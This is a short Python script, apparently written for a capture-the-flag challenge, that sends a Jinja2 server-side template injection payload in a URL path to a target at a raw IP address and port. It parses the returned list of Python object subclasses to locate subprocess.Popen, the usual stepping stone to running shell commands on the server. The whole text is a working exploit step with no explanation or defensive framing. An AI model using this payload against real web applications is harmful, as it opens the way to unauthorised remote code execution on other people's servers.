import requests
from bs4 import BeautifulSoup
import urllib

res = requests.get("http://142.93.35.129:31374/{{''.__class__.__base__.__subclasses__()}}")
content = BeautifulSoup(res.text, 'lxml')
hack = content.find('p').text.strip('[]').split(',')

for i in range(0, len(hack)):
    if 'subprocess.Popen' in hack[i]:
        print(hack[i], i)